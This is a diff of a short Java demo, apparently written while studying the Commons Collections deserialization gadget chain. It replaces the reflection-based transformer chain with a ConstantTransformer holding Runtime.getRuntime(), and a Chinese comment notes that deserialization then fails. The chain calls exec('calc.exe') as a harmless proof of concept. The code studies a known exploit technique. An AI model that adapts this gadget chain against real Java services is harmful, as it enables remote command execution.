@@ -1,3 +1,5 @@
+package demo.makeChain;
+
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -7,15 +9,12 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
-import java.lang.reflect.Method;
 
-public class Demo5 {
+public class Demo3 {
     public static void main(String[] args) throws Exception{
 
         Transformer[] transformers = {
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
-                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
+                new ConstantTransformer(Runtime.getRuntime()),
                 new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
         };
         ChainedTransformer chain = new ChainedTransformer(transformers);
@@ -23,7 +22,7 @@ public class Demo5 {
         //序列化
         FileOutputStream file = new FileOutputStream("chenlvtang.bin");
         ObjectOutputStream se = new ObjectOutputStream(file);
-        se.writeObject(chain);
+        se.writeObject(chain);//反序列化失败
         se.close();
         //反序列化
         FileInputStream file1 = new FileInputStream("chenlvtang.bin");
@@ -32,5 +31,6 @@ public class Demo5 {
         unse.close();
 
         serverRead.transform("foobar");
+
     }
 }
